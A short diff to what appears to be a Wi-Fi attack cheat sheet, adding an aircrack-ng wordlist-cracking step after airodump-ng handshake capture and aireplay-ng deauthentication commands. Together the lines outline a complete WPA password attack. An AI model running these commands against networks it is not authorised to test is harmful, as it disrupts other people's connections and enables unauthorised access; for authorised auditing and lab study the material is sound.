@@ -23,7 +23,8 @@ airodump-ng --bssid <XX:XX...> -c <channel> -w <wlanname> mon0
 aireplay-ng --deauth 0 -a <XX::XX..> -c <client> mon0
 
 
-
+#-- Crack with aircrack-ng
+aircrack-ng -w /usr/share/wordlists/rockyou.txt xx.cap
 
 
 
